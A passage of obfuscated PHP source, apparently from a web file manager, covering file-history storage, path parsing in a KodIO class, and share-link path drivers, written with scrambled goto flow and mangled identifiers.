$BŒÚÚƒŒÀÚ) { if ($BŒÚÚƒŒÀÚ[$aïå¢òè¶[402]] != $c½–óÈÅ¹) { continue; } $fÉ„óÔÓÈ† = $e•Üâààš„[$aïå¢òè¶[1137]] . $BŒÚÚƒŒÀÚ[$aïå¢òè¶[28]]; break; } if (!$fÉ„óÔÓÈ†) { show_json(LNG($aïå¢òè¶[105]), !1); } goto F§ËÌí›¼É; F§ËÌí›¼É: return IO::info($fÉ„óÔÓÈ†); goto AÇø…‡éÜƒ; dî‡Ÿ¸›×ß: $aïå¢òè¶ =& $_SERVER[úÉ·öƒÑì©]; $e•Üâààš„ = self::listData($dÒô—äùó); if (!$e•Üâààš„) { show_json(LNG($aïå¢òè¶[105]), !1); } goto f¢ªÜØğíÀ; AÇø…‡éÜƒ: } public static function fileOut($f’Œ‰İ­ñÛ, $aø²´¥ªöÄ, $fÄ˜øœùÈ˜ = false) { $c¶°¥äåÇ =& $_SERVER[úÉ·öƒÑì©]; $dÙ¦ã°‹™¾ = self::fileInfo($f’Œ‰İ­ñÛ, $aø²´¥ªöÄ); $D–ÊåÏÜÏ· =& $GLOBALS[$c¶°¥äåÇ[7]]; $fÄ˜øœùÈ˜ = isset($D–ÊåÏÜÏ·[$c¶°¥äåÇ[1102]]) && $D–ÊåÏÜÏ·[$c¶°¥äåÇ[1102]] == 1; if (isset($D–ÊåÏÜÏ·[$c¶°¥äåÇ[29]]) && $D–ÊåÏÜÏ·[$c¶°¥äåÇ[29]] == $c¶°¥äåÇ[1139]) { return IO::fileOutImage($dÙ¦ã°‹™¾[$c¶°¥äåÇ[76]], $D–ÊåÏÜÏ·[$c¶°¥äåÇ[1140]]); } IO::fileOut($dÙ¦ã°‹™¾[$c¶°¥äåÇ[76]], $fÄ˜øœùÈ˜, get_path_this($f’Œ‰İ­ñÛ)); } public static function listData($E¼×’°ãÉµ, $Bƒ»±áù‹ê = true) { goto bóÛçØ©£À; bóÛçØ©£À: $EåÁÚòÕÀ¯ =& $_SERVER[úÉ·öƒÑì©]; if ($Bƒ»±áù‹ê && !IO::exist($E¼×’°ãÉµ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto AÜñ±½åâÌ; eáğÉßß“Ï: $C–Ëß¿í‰ = IO::getContent($DËƒŒÂ¶®[$EåÁÚòÕÀ¯[1138]]); if ($C–Ëß¿í‰) { $f‹…À¢ó“ = json_decode($C–Ëß¿í‰, !0); if (is_array($f‹…À¢ó“)) { $DËƒŒÂ¶®[$EåÁÚòÕÀ¯[376]] = $f‹…À¢ó“; } } return $DËƒŒÂ¶®; goto aÙ…§×äà; AÜñ±½åâÌ: if (substr($E¼×’°ãÉµ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $DÓÈÁ‚§Îò = self::pathHistory($E¼×’°ãÉµ); $DËƒŒÂ¶® = array($EåÁÚòÕÀ¯[1138] => $DÓÈÁ‚§Îò . $EåÁÚòÕÀ¯[1126], $EåÁÚòÕÀ¯[1137] => rtrim(get_path_father($DÓÈÁ‚§Îò), $EåÁÚòÕÀ¯[8]) . $EåÁÚòÕÀ¯[8], $EåÁÚòÕÀ¯[376] => array()); goto eáğÉßß“Ï; aÙ…§×äà: } private static function saveData($a¸¼¬Ú¬ºÊ, $fºÕ‹¼‘÷Š) { goto BÒ‰ˆµ‰Çò; BÒ‰ˆµ‰Çò: $fÉâ„ŠÆÔµ =& $_SERVER[úÉ·öƒÑì©]; self::log($fÉâ„ŠÆÔµ[1141] . $a¸¼¬Ú¬ºÊ . $fÉâ„ŠÆÔµ[68] . count($fºÕ‹¼‘÷Š), $fÉâ„ŠÆÔµ[728]); if ($fºÕ‹¼‘÷Š) { return IO::setContent($a¸¼¬Ú¬ºÊ, json_encode($fºÕ‹¼‘÷Š)); } goto EŒŠéÎâ«ø; EŒŠéÎâ«ø: $cÃåéÙİÎ® = IO::pathFather($a¸¼¬Ú¬ºÊ); IO::remove($a¸¼¬Ú¬ºÊ); self::clearEmptyFolder($cÃåéÙİÎ®); goto CÄ„Š°àîÇ; CÄ„Š°àîÇ: return !0; goto E¹Ùİç¤„õ; E¹Ùİç¤„õ: } public static function clearEmptyFolder($f„è“Ü…ÜÚ) { goto CÔÌãÎ®¸; CÔÌãÎ®¸: $eáÆ¯¢åÜ„ =& $_SERVER[úÉ·öƒÑì©]; if (trim($f„è“Ü…ÜÚ, $eáÆ¯¢åÜ„[8]) == trim(self::$_historyBase, $eáÆ¯¢åÜ„[8])) { return; } $cİ»éË´Åò = IO::pathFather($f„è“Ü…ÜÚ); goto bˆòò½î¿Ï; bˆòò½î¿Ï: $BİóÔƒåœÇ = IO::has($f„è“Ü…ÜÚ, !0); if ($BİóÔƒåœÇ[$eáÆ¯¢åÜ„[203]] > 0 || $BİóÔƒåœÇ[$eáÆ¯¢åÜ„[204]] > 0) { return; } IO::remove($f„è“Ü…ÜÚ); goto e¥©ËÆÌò; e¥©ËÆÌò: self::clearEmptyFolder($cİ»éË´Åò); goto cÛÆ¤ÓÖ†Õ; cÛÆ¤ÓÖ†Õ: } private static function getBasePath() { goto Fš‹‡Ş±ŸÓ; d…Á†¨ÀœÇ: file_put_contents($Eçäğ©ÅäÚ . $cšÄàœ‰ç[1145], $cšÄàœ‰ç[33]); Model($cšÄàœ‰ç[1142])->set($cšÄàœ‰ç[1143], $Eçäğ©ÅäÚ); return $Eçäğ©ÅäÚ; goto bêè‘Ğîä; Fš‹‡Ş±ŸÓ: $cšÄàœ‰ç =& $_SERVER[úÉ·öƒÑì©]; $Eçäğ©ÅäÚ = Model($cšÄàœ‰ç[1142])->get($cšÄàœ‰ç[1143]); if (IO::exist($Eçäğ©ÅäÚ)) { return $Eçäğ©ÅäÚ; } goto AÒ¼‘ñÌÛğ; AÒ¼‘ñÌÛğ: $Eçäğ©ÅäÚ = DATA_PATH . $cšÄàœ‰ç[1144]; $Eçäğ©ÅäÚ = IO::mkdir($Eçäğ©ÅäÚ); $Eçäğ©ÅäÚ = rtrim($Eçäğ©ÅäÚ, $cšÄàœ‰ç[8]) . $cšÄàœ‰ç[8]; goto d…Á†¨ÀœÇ; bêè‘Ğîä: } } class KodIO { const KOD_SOURCE = "\173\163\x6f\165\162\143\145\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\145\x72\122\145\143\x79\x63\154\x65\x7d"; const KOD_USER_FAV = "\x7b\165\x73\145\x72\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\162\x46\x69\x6c\x65\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\x65\x72\106\x69\x6c\145\x54\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\165\160\122\x6f\157\164\x53\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\165\x73\145\162\123\x68\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\x72\x53\150\x61\x72\145\114\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\x61\x72\x65\124\157\115\x65\175"; const KOD_SHARE_ITEM = "\173\163\150\x61\x72\145\111\164\145\155\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\x72\x65\111\164\145\x6d\x4c\x69\156\153\x7d"; const KOD_SEARCH = "\173\x73\x65\x61\162\x63\150\x7d"; const KOD_BLOCK = "\x7b\x62\x6c\157\x63\153\x7d"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\165\163\x65\x72\122\145\x6e\143\x65\156\x74\175"; const KOD_USER_DRIVER = "\x7b\x64\162\151\x76\x65\162\x7d"; public static function typeList() { $F¶¹õ’˜¹¯ =& $_SERVER[úÉ·öƒÑì©]; return array($F¶¹õ’˜¹¯[1146] => self::KOD_SOURCE, $F¶¹õ’˜¹¯[1147] => self::KOD_USER_RECYCLE, $F¶¹õ’˜¹¯[1148] => self::KOD_USER_FAV, $F¶¹õ’˜¹¯[1149] => self::KOD_USER_FILE_TAG, $F¶¹õ’˜¹¯[1150] => self::KOD_USER_FILE_TYPE, $F¶¹õ’˜¹¯[1151] => self::KOD_GROUP_ROOT_SELF, $F¶¹õ’˜¹¯[1152] => self::KOD_USER_SHARE, $F¶¹õ’˜¹¯[1153] => self::KOD_USER_SHARE_LINK, $F¶¹õ’˜¹¯[1154] => self::KOD_USER_SHARE_TO_ME, $F¶¹õ’˜¹¯[1155] => self::KOD_SHARE_ITEM, $F¶¹õ’˜¹¯[1156] => self::KOD_SHARE_LINK, $F¶¹õ’˜¹¯[1157] => self::KOD_SEARCH, $F¶¹õ’˜¹¯[1158] => self::KOD_BLOCK, $F¶¹õ’˜¹¯[1159] => self::KOD_IO, $F¶¹õ’˜¹¯[1160] => self::KOD_USER_RECENT, $F¶¹õ’˜¹¯[1161] => self::KOD_USER_DRIVER); } public static function parse($D‹º—‹­¯Ã) { goto a£†ÇˆšÅ›; DƒàÏø™•é: $BäŒô‚Ö‡µ = array($AÃœÏŒÅõ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $cÇ›Ó°¨ƒ‘[$AÃœÏŒÅõ[1128]] = in_array($cÇ›Ó°¨ƒ‘[$AÃœÏŒÅõ[29]], $BäŒô‚Ö‡µ); return $cÇ›Ó°¨ƒ‘; goto DÇíã•Éá; a£†ÇˆšÅ›: $AÃœÏŒÅõ =& $_SERVER[úÉ·öƒÑì©]; $D‹º—‹­¯Ã = self::clear($D‹º—‹­¯Ã); $e“óÛÉôƒ = array_values(self::typeList()); goto b¦ƒÇ§¨Øß; b¦ƒÇ§¨Øß: preg_match($AÃœÏŒÅõ[1162], $D‹º—‹­¯Ã, $a’â¢½Í¶); $cÇ›Ó°¨ƒ‘ = array($AÃœÏŒÅõ[424] => !1, $AÃœÏŒÅõ[1163] => !1, $AÃœÏŒÅõ[421] => !1, $AÃœÏŒÅõ[76] => $D‹º—‹­¯Ã, $AÃœÏŒÅõ[1073] => !1, $AÃœÏŒÅõ[1072] => $AÃœÏŒÅõ[33]); if (is_array($a’â¢½Í¶) && count($a’â¢½Í¶) == 5) { $Eæ’ä ‚ä = $AÃœÏŒÅõ[1164] . $a’â¢½Í¶[2] . $AÃœÏŒÅõ[334]; if (in_array($Eæ’ä ‚ä, $e“óÛÉôƒ)) { $cÇ›Ó°¨ƒ‘[$AÃœÏŒÅõ[1073]] = $a’â¢½Í¶[1]; $cÇ›Ó°¨ƒ‘[$AÃœÏŒÅõ[29]] = $Eæ’ä ‚ä; $cÇ›Ó°¨ƒ‘[$AÃœÏŒÅõ[1165]] = substr($Eæ’ä ‚ä, 1, -1); $cÇ›Ó°¨ƒ‘[$AÃœÏŒÅõ[402]] = $a’â¢½Í¶[3]; } $cÇ›Ó°¨ƒ‘[$AÃœÏŒÅõ[1072]] = $a’â¢½Í¶[4]; } goto DƒàÏø™•é; DÇíã•Éá: } public static function isTruePath($b×¸™Õô) { goto Aî¶—¸õí…; aÈ¨¸Œçó: if (strpos($b×¸™Õô, $C’Î×òäãÙ[1131]) === 0) { return !0; } if (strpos($b×¸™Õô, $C’Î×òäãÙ[1166]) === 0) { return !0; } if (strpos($b×¸™Õô, $C’Î×òäãÙ[1167]) === 0) { return !0; } goto E¨˜Îø„»Ğ; Aî¶—¸õí…: $C’Î×òäãÙ =& $_SERVER[úÉ·öƒÑì©]; if (substr($b×¸™Õô, 0, 1) != $C’Î×òäãÙ[1164]) { return !0; } if (strpos($b×¸™Õô, $C’Î×òäãÙ[410]) === 0) { return !0; } goto aÈ¨¸Œçó; E¨˜Îø„»Ğ: if (strpos($b×¸™Õô, $C’Î×òäãÙ[1168]) === 0) { return !0; } return !1; goto E–…Ş Ù“§; E–…Ş Ù“§: } public static function clear($cë ¯…ˆğŠ) { goto EºœÈÑ§‹–; EºœÈÑ§‹–: $dëø‘ªˆÙ =& $_SERVER[úÉ·öƒÑì©]; $cë ¯…ˆğŠ = str_replace(array($dëø‘ªˆÙ[1046], $dëø‘ªˆÙ[229]), $dëø‘ªˆÙ[50], $cë ¯…ˆğŠ); $cë ¯…ˆğŠ = str_replace($dëø‘ªˆÙ[97], $dëø‘ªˆÙ[8], $cë ¯…ˆğŠ); goto AÒ¨™å; E¨Å¼åÄØ: return $cë ¯…ˆğŠ; goto fÅ“ôÚ¸®¤; AÒ¨™å: $Díó¯ƒåÒ = $dëø‘ªˆÙ[1169]; if (substr($cë ¯…ˆğŠ, 0, 3) == $dëø‘ªˆÙ[1170]) { $cë ¯…ˆğŠ = substr($cë ¯…ˆğŠ, 3); } while (strstr($cë ¯…ˆğŠ, $Díó¯ƒåÒ)) { $cë ¯…ˆğŠ = str_replace($Díó¯ƒåÒ, $dëø‘ªˆÙ[8], $cë ¯…ˆğŠ); } goto d—‹¬¼óİù; d—‹¬¼óİù: $cë ¯…ˆğŠ = preg_replace($dëø‘ªˆÙ[1171], $dëø‘ªˆÙ[8], $cë ¯…ˆğŠ); if ($cë ¯…ˆğŠ == $dëø‘ªˆÙ[8]) { return $dëø‘ªˆÙ[8]; } $cë ¯…ˆğŠ = rtrim($cë ¯…ˆğŠ, $dëø‘ªˆÙ[8]); goto E¨Å¼åÄØ; fÅ“ôÚ¸®¤: } public static function sourceID($a•Š†óÊ«‹) { $eùİº™ïá =& $_SERVER[úÉ·öƒÑì©]; $CŒÈñÎï˜Æ = self::parse($a•Š†óÊ«‹); if ($CŒÈñÎï˜Æ[$eùİº™ïá[29]] !== self::KOD_SOURCE) { show_json(LNG($eùİº™ïá[1172]), !1); } return $CŒÈñÎï˜Æ[$eùİº™ïá[402]]; } public static function make($dóà†´©ÏŞ) { if (!$dóà†´©ÏŞ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($dóà†´©ÏŞ)); } public static function makeShare($b›®­è·¯ê, $CÑÚÏŞµï‰) { return self::makePath(self::KOD_SHARE_ITEM, $b›®­è·¯ê, $CÑÚÏŞµï‰); } public static function makeFileTypePath($bêÇÇ¿˜í) { return self::makePath(self::KOD_USER_FILE_TYPE, $bêÇÇ¿˜í); } public static function makeFileTagPath($c¶ôá“˜çƒ) { return self::makePath(self::KOD_USER_FILE_TAG, $c¶ôá“˜çƒ); } public static function makePath($Dš‰…±ÑÌæ, $b”Çê¥Õ“Î = '', $aœ™ÒË‚¼¿ = '') { $aÊäÊ¹¯©ë =& $_SERVER[úÉ·öƒÑì©]; $d¹³¿õ—¢² = substr($Dš‰…±ÑÌæ, 1, -1); $CÁáœ‡ÛÎ‰ = $aÊäÊ¹¯©ë[1173] . $d¹³¿õ—¢² . $aÊäÊ¹¯©ë[1174] . $b”Çê¥Õ“Î . $aÊäÊ¹¯©ë[1175]; $CÁáœ‡ÛÎ‰ = $aœ™ÒË‚¼¿ ? $CÁáœ‡ÛÎ‰ . $aœ™ÒË‚¼¿ . $aÊäÊ¹¯©ë[8] : $CÁáœ‡ÛÎ‰; return $CÁáœ‡ÛÎ‰; } public static function hashPath($f…ˆá¦®, $f‡ÈÃ—Ì­ñ = true) { goto c¬ëİ‘Óß’; d¤½æ‡ÎİÛ: return $d‚Ê‘çƒ¦; goto cáÏ’ÌÛá“; c¬ëİ‘Óß’: $EÒù•ŒšÑ =& $_SERVER[úÉ·öƒÑì©]; $BÌÑ‘¾È† = is_array($f…ˆá¦®) ? $f…ˆá¦® : IO::info($f…ˆá¦®); $d‚Ê‘çƒ¦ = _get($BÌÑ‘¾È†, $EÒù•ŒšÑ[1176], $EÒù•ŒšÑ[33]); goto F‡¹ïÈ›“•; F‡¹ïÈ›“•: if (!$d‚Ê‘çƒ¦ && isset($BÌÑ‘¾È†[$EÒù•ŒšÑ[404]])) { $BÌÑ‘¾È† = IO::info(KodIO::make($BÌÑ‘¾È†[$EÒù•ŒšÑ[404]])); $d‚Ê‘çƒ¦ = _get($BÌÑ‘¾È†, $EÒù•ŒšÑ[1176], $EÒù•ŒšÑ[33]); } if (!$d‚Ê‘çƒ¦ && $f‡ÈÃ—Ì­ñ) { $c·¹Ğ·ˆ­‚ = KodIO::parse($BÌÑ‘¾È†[$EÒù•ŒšÑ[76]]); if (!$c·¹Ğ·ˆ­‚[$EÒù•ŒšÑ[29]]) { $d‚Ê‘çƒ¦ = IO::hashSimple($BÌÑ‘¾È†[$EÒù•ŒšÑ[76]]); } } if (!$d‚Ê‘çƒ¦) { $d‚Ê‘çƒ¦ = md5($BÌÑ‘¾È†[$EÒù•ŒšÑ[76]] . $BÌÑ‘¾È†[$EÒù•ŒšÑ[78]] . $BÌÑ‘¾È†[$EÒù•ŒšÑ[84]]); } goto d¤½æ‡ÎİÛ; cáÏ’ÌÛá“: } public static function initSystemPath() { goto B–î‹œ¯; B–î‹œ¯: $D¼¶³ÂİÍï =& $_SERVER[úÉ·öƒÑì©]; if (defined($D¼¶³ÂİÍï[1177])) { return; } define($D¼¶³ÂİÍï[1177], self::systemPath($D¼¶³ÂİÍï[1178])); goto EÃ¼‹¤½†¨; D·‡Š´˜ìĞ: IOHistory::bindEvent(); goto cëÍ™ì‹—·; EÃ¼‹¤½†¨: define($D¼¶³ÂİÍï[1179], self::systemPath($D¼¶³ÂİÍï[1180])); define($D¼¶³ÂİÍï[1181], self::systemPath($D¼¶³ÂİÍï[1182])); define($D¼¶³ÂİÍï[1183], self::systemPath($D¼¶³ÂİÍï[1184])); goto D·‡Š´˜ìĞ; cëÍ™ì‹—·: } public static function systemPath($BîÑ¼Í…„Ï) { goto AÎ£öİÑŠ”; B¸ÉŠí‹: if ($e›Á‹Îßßµ) { return $e›Á‹Îßßµ; } if ($BîÑ¼Í…„Ï == $BŠä¨“º‡[1178]) { $e›Á‹Îßßµ = self::make(Model($BŠä¨“º‡[806])->systemRootPathAdd($BŠä¨“º‡[514])); } else { $e›Á‹Îßßµ = self::systemPath($BŠä¨“º‡[1178]); $C¨‘Ëä©„³ = self::sourceID($e›Á‹Îßßµ); $e›Á‹Îßßµ = self::make(Model($BŠä¨“º‡[806])->mkdir($C¨‘Ëä©„³, $BîÑ¼Í…„Ï)); } Model($BŠä¨“º‡[746])->set($Eñ…‘‚éèÍ, $e›Á‹Îßßµ); goto fƒé»£Ú; AÎ£öİÑŠ”: $BŠä¨“º‡ =& $_SERVER[úÉ·öƒÑì©]; $Eñ…‘‚éèÍ = $BŠä¨“º‡[1185] . ucfirst($BîÑ¼Í…„Ï); $e›Á‹Îßßµ = Model($BŠä¨“º‡[746])->get($Eñ…‘‚éèÍ); goto B¸ÉŠí‹; fƒé»£Ú: return $e›Á‹Îßßµ; goto C¤©ğŞŒÃ; C¤©ğŞŒÃ: } public static function systemFolder($dğˆö¬îÅ) { $Bé§š–¡è = IO_PATH_SYSTEM_SOURCE . $dğˆö¬îÅ; $dóÒÌÊÓ£ = Cache::get($Bé§š–¡è); if (!$dóÒÌÊÓ£) { $FÚŒçš’¾Î = IO::infoFull($Bé§š–¡è); if (!$FÚŒçš’¾Î) { $dóÒÌÊÓ£ = IO::mkdir($Bé§š–¡è, REPEAT_SKIP); } else { $dóÒÌÊÓ£ = $FÚŒçš’¾Î[$_SERVER[úÉ·öƒÑì©][76]]; } Cache::set($Bé§š–¡è, $dóÒÌÊÓ£, 3600 * 10); } return $dóÒÌÊÓ£; } public static function defaultDriver() { return Model($_SERVER[úÉ·öƒÑì©][743])->defaultDriver(); } public static function defaultIO() { $D…—„¢Œ¥Ş =& $_SERVER[úÉ·öƒÑì©]; $fĞÜ”Á­Ûë = self::defaultDriver(); return $D…—„¢Œ¥Ş[1186] . $fĞÜ”Á­Ûë[$D…—„¢Œ¥Ş[402]] . $D…—„¢Œ¥Ş[1175]; } public static function defaultDriverInit() { static $f£­¾â¡´ˆ = false; if ($f£­¾â¡´ˆ) { return $f£­¾â¡´ˆ; } $f£­¾â¡´ˆ = IO::init(self::defaultIO()); return $f£­¾â¡´ˆ; } public static function fileTypeList() { $aùØÍßë•õ =& $_SERVER[úÉ·öƒÑì©]; $AŸŞ‡¦ÔÓ† = $GLOBALS[$aùØÍßë•õ[6]][$aùØÍßë•õ[1187]]; foreach ($AŸŞ‡¦ÔÓ† as $c½µä§¸ôØ => $Fä¬×ŞÖ‡¿) { $AÄ³§‘÷ê = $aùØÍßë•õ[1188] . $c½µä§¸ôØ; $aÈèÂÍ«ë¥ = LNG($AÄ³§‘÷ê); if ($AÄ³§‘÷ê != $aÈèÂÍ«ë¥) { $AŸŞ‡¦ÔÓ†[$c½µä§¸ôØ][$aùØÍßë•õ[28]] = $aÈèÂÍ«ë¥; } } return $AŸŞ‡¦ÔÓ†; } public static function transferType($D˜òİŞñŒ, $c¼„©¾Îï¤) { goto d„ÆÄ‚ò¦; d„ÆÄ‚ò¦: $c£ëÏËšÕó =& $_SERVER[úÉ·öƒÑì©]; $bŞÄĞ§Å = self::driverType($D˜òİŞñŒ); $eÚ¼¿ºù´ = self::driverType($c¼„©¾Îï¤); goto eáªÜ¾ë÷; eáªÜ¾ë÷: if ($bŞÄĞ§Å[$c£ëÏËšÕó[29]] == $eÚ¼¿ºù´[$c£ëÏËšÕó[29]] && $bŞÄĞ§Å[$c£ëÏËšÕó[1189]] == $eÚ¼¿ºù´[$c£ëÏËšÕó[1189]]) { return $c£ëÏËšÕó[1190]; } if ($bŞÄĞ§Å[$c£ëÏËšÕó[29]] == $c£ëÏËšÕó[839] && $eÚ¼¿ºù´[$c£ëÏËšÕó[29]] == $c£ëÏËšÕó[106]) { return $c£ëÏËšÕó[1102]; } if ($bŞÄĞ§Å[$c£ëÏËšÕó[29]] == $c£ëÏËšÕó[106] && $eÚ¼¿ºù´[$c£ëÏËšÕó[29]] == $c£ëÏËšÕó[839]) { return $c£ëÏËšÕó[107]; } goto F¡®é¥ì¾Î; F¡®é¥ì¾Î: return $c£ëÏËšÕó[1191]; goto b‘Ë‰°ä«Ï; b‘Ë‰°ä«Ï: } public static function driverType($cÒß¶äáœØ) { goto fÜ¨ñ–à¿¯; BÑŠ°„ôÆ: return array($a ¨‚Ë®öä[29] => $a ¨‚Ë®öä[839], $a ¨‚Ë®öä[1189] => $cÒß¶äáœØ->pathDriver, $a ¨‚Ë®öä[76] => $d¦•à¦÷óÌ); goto BÍßª‚¢ğ…; f˜–‚¡¯‚: if ($FÒÌ¿¼¥ÚÀ == $a ¨‚Ë®öä[734] || $FÒÌ¿¼¥ÚÀ == $a ¨‚Ë®öä[1193] || $FÒÌ¿¼¥ÚÀ == $a ¨‚Ë®öä[1194]) { $cÒß¶äáœØ = self::defaultDriverInit(); } else { if ($FÒÌ¿¼¥ÚÀ == $a ¨‚Ë®öä[1109] || $FÒÌ¿¼¥ÚÀ == $a ¨‚Ë®öä[1195]) { $cÒß¶äáœØ = IO::init($cÒß¶äáœØ->pathParse[$a ¨‚Ë®öä[1056]]); } } $FÒÌ¿¼¥ÚÀ = str_replace($a ¨‚Ë®öä[1192], $a ¨‚Ë®öä[33], strtolower($cÒß¶äáœØ->getType())); if ($FÒÌ¿¼¥ÚÀ == $a ¨‚Ë®öä[106]) { return array($a ¨‚Ë®öä[29] => $a ¨‚Ë®öä[106], $a ¨‚Ë®öä[1189] => $a ¨‚Ë®öä[33], $a ¨‚Ë®öä[76] => $d¦•à¦÷óÌ); } goto BÑŠ°„ôÆ; fÜ¨ñ–à¿¯: $a ¨‚Ë®öä =& $_SERVER[úÉ·öƒÑì©]; $d¦•à¦÷óÌ = $cÒß¶äáœØ->path; $FÒÌ¿¼¥ÚÀ = str_replace($a ¨‚Ë®öä[1192], $a ¨‚Ë®öä[33], strtolower($cÒß¶äáœØ->getType())); goto f˜–‚¡¯‚; BÍßª‚¢ğ…: } } goto b¾ºç†™ö; DŠ»µ…êŒ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($f¢›—°åÛ¨) { $this->pathParse = $f¢›—°åÛ¨; $this->model = Model($_SERVER[úÉ·öƒÑì©][1213]); } protected function infoParse($CÂÆ„ƒ›¾¡, $DÚÎîÉâÊÜ = false, $fµ¥®øïÄá = false) { $Bğ…êÚ‡ºÔ =& $_SERVER[úÉ·öƒÑì©]; return Action($Bğ…êÚ‡ºÔ[1078])->sharePathInfo($this->pathParse[$Bğ…êÚ‡ºÔ[76]], !0); } public function listPath($AÌÜÈ‹á¥, $F†ä±ºï Š = false) { $B®±©‘”‹¡ =& $_SERVER[úÉ·öƒÑì©]; $A„²µÜÖá = parent::listPath($AÌÜÈ‹á¥, $F†ä±ºï Š); foreach ($A„²µÜÖá as $A¸è‰¼ŞÂÁ => $fì®ºÕ”½) { if (!in_array($A¸è‰¼ŞÂÁ, array($B®±©‘”‹¡[74], $B®±©‘”‹¡[75]))) { continue; } foreach ($fì®ºÕ”½ as $fê‚ÔáÁ¢¶ => $f×ÚÙßç‡²) { $A„²µÜÖá[$A¸è‰¼ŞÂÁ][$fê‚ÔáÁ¢¶] = Action($B®±©‘”‹¡[1078])->shareItemInfo($f×ÚÙßç‡²); } } return $A„²µÜÖá; } public function listAll($E‘’…ª×êå) { goto CˆÒÈ„òˆ†; CˆÒÈ„òˆ†: $e¤ ä¯Ó» =& $_SERVER[úÉ·öƒÑì©]; $C·ÓÎß‚©Š = IO::info($this->pathParse[$e¤ ä¯Ó»[76]]); if (!$C·ÓÎß‚©Š) { return array(); } goto D‹‚Õƒ“Š™; A¸äšÊ¿›°: return $dŒ”ˆ˜ï™Ä; goto cÂÜ¦”‡ë”; D‹‚Õƒ“Š™: $dŒ”ˆ˜ï™Ä = $this->model->listAll($E‘’…ª×êå); foreach ($dŒ”ˆ˜ï™Ä as &$Cºá«Ö°) { $Cºá«Ö°[$e¤ ä¯Ó»[85]] = Action($e¤ ä¯Ó»[1078])->shareItemInfo($Cºá«Ö°[$e¤ ä¯Ó»[85]]); } unset($Cºá«Ö°); goto A¸äšÊ¿›°; cÂÜ¦”‡ë”: } } class PathDriverDriverShareItem { public function __construct($Eõ»áãİ£•) { $this->pathParse = $Eõ»áãİ£•; } public function __call($Dñ¹ğ›í«Ù, $a‡³´‡¶) { $bó¡ËŞÕ—§ =& $_SERVER[úÉ·öƒÑì©]; if (method_exists($this, $Dñ¹ğ›í«Ù)) { return; } $E«ñÛ›Ò­Ö = call_user_func_array(array($bó¡ËŞÕ—§[1222], $Dñ¹ğ›í«Ù), $a‡³´‡¶); $cÛ¾ö©—®ß = array($bó¡ËŞÕ—§[1223], $bó¡ËŞÕ—§[1224], $bó¡ËŞÕ—§[1225], $bó¡ËŞÕ—§[1226], $bó¡ËŞÕ—§[527], $bó¡ËŞÕ—§[529], $bó¡ËŞÕ—§[1227], $bó¡ËŞÕ—§[107], $bó¡ËŞÕ—§[1228], $bó¡ËŞÕ—§[1229]); if (in_array($Dñ¹ğ›í«Ù, $cÛ¾ö©—®ß)) { $E«ñÛ›Ò­Ö = $this->getPathOuter($E«ñÛ›Ò­Ö); } return $E«ñÛ›Ò­Ö; } public function copy($fø×££áí, $eŠÈ§øƒÕ, $c‹Ò¹Ÿ½¯Ú = false) { return $this->copyMove($fø×££áí, $eŠÈ§øƒÕ, $c‹Ò¹Ÿ½¯Ú, $_SERVER[úÉ·öƒÑì©][527]); } public function move($b—Ÿ¹ïİÔš, $bíôÏÕËÛë, $A›ê…¥šµñ = false) { return $this->copyMove($b—Ÿ¹ïİÔš, $bíôÏÕËÛë, $A›ê…¥šµñ, $_SERVER[úÉ·öƒÑì©][529]); } private function copyMove($cñÕ®©¼ŠŸ, $EôÇ‚‡×ªå, $BøçßÏ”¯÷, $BîÓ¨—İ»´) { goto bê¢â‡Øè; eÛÀØô’ñŞ: if ($F·ïØ»’´->pathParse[$b°‘÷ĞßÒß[1056]]) { $EôÇ‚‡×ªå = $F·ïØ»’´->pathParse[$b°‘÷ĞßÒß[1056]]; } else { $EôÇ‚‡×ªå = $eãÜÍ¥Ÿ; } $B£Œ®Ú—‚¦ = IO::copyMove($cñÕ®©¼ŠŸ, $EôÇ‚‡×ªå, $BøçßÏ”¯÷, $BîÓ¨—İ»´); $B£Œ®Ú—‚¦ = $this->getPathOuter($B£Œ®Ú—‚¦); goto E‘¥ÉÈ°; bê¢â‡Øè: $b°‘÷ĞßÒß =& $_SERVER[úÉ·öƒÑì©]; $eãÜÍ¥Ÿ = $EôÇ‚‡×ªå; $F·ïØ»’´ = IO::driverMake($EôÇ‚‡×ªå); goto eÛÀØô’ñŞ; E‘¥ÉÈ°: return $B£Œ®Ú—‚¦; goto D’Š²°¢Ä©; D’Š²°¢Ä©: } public function pathThis($DéÓÑŞ„®¾) { return get_path_this($this->pathParse[$_SERVER[úÉ·öƒÑì©][76]]); } public function pathFather($FÀ°¬İŠ) { return get_path_father($this->pathParse[$_SERVER[úÉ·öƒÑì©][76]]); } public function iconvSystem($b¾Áêß‹ˆÙ) { return $b¾Áêß‹ˆÙ; } protected function infoParse($FŠ×îÏó¥Œ, $CÊêÉİ¦¡¢ = false) { $bÔÒ¬ó‡‘Ø =& $_SERVER[úÉ·öƒÑì©]; $BÀ¤…ñƒ¥˜ = $this->pathParse[$bÔÒ¬ó‡‘Ø[475]][$bÔÒ¬ó‡‘Ø[1079]] . $this->pathParse[$bÔÒ¬ó‡‘Ø[1072]]; if ($CÊêÉİ¦¡¢) { $dØÖ™³¤ñÒ = IO::infoWithChildren($BÀ¤…ñƒ¥˜); } else { $dØÖ™³¤ñÒ = IO::info($BÀ¤…ñƒ¥˜); } $aÌö÷Üçƒ÷ = $this->pathParse[$bÔÒ¬ó‡‘Ø[475]]; return Action($bÔÒ¬ó‡‘Ø[1221])->_shareItemeParse($dØÖ™³¤ñÒ, $aÌö÷Üçƒ÷); } public function listAll($Fˆ½š®¸”Â) { $eÛ¤ìÍŸÉ =& $_SERVER[úÉ·öƒÑì©]; 